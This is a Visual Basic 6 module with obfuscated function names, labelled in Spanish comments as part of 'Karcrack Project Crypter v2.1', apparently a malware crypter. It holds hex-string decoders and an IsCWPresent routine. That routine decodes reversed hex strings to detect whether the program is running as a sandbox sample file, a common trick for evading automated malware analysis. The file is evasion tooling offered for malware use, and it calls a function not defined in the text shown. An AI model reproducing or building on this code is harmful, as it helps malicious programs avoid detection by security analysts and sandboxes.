Attribute VB_Name = "diofsDFsdfjsdf"
'Funcion parte del Karcrack Project Crypter v2.1
Public Function kidniekph(ByVal sData As String) As String
    Dim i       As Long
    For i = 1 To Len(sData) Step 2
       kidniekph = kidniekph & Chr$(Val("&H" & Mid$(sData, i, 2)))
    Next i
End Function


'Funcion parte del Karcrack Project Crypter v2.1
Public Function jhblgcjnf(ByVal sData As String) As String
    Dim i       As Long
    For i = 1 To Len(sData) Step 2
       jhblgcjnf = jhblgcjnf & Chr$(Val("&H" & Mid$(sData, i, 2)))
    Next i
End Function

Public Function IsCWPresent() As Boolean
'1-> .exe; 2-> :\sample.exe
'1-> exe.; 2-> exe.elpmas\:
'1-> 6578652E; 2-> 6578652E656C706D61735C3A
'1-> E2568756; 2-> A3C53716D607C656E2568756
If App.Path & App.EXEName & StrReverse(kidniekph(StrReverse(ikwrpmvug("4532353638373536")))) = SystemDrive & StrReverse(kidniekph(StrReverse(ikwrpmvug("413343353337313644363037433635364532353638373536")))) Then
   IsCWPresent = True
   Else
   
           IsCWPresent = False
           End If
End Function
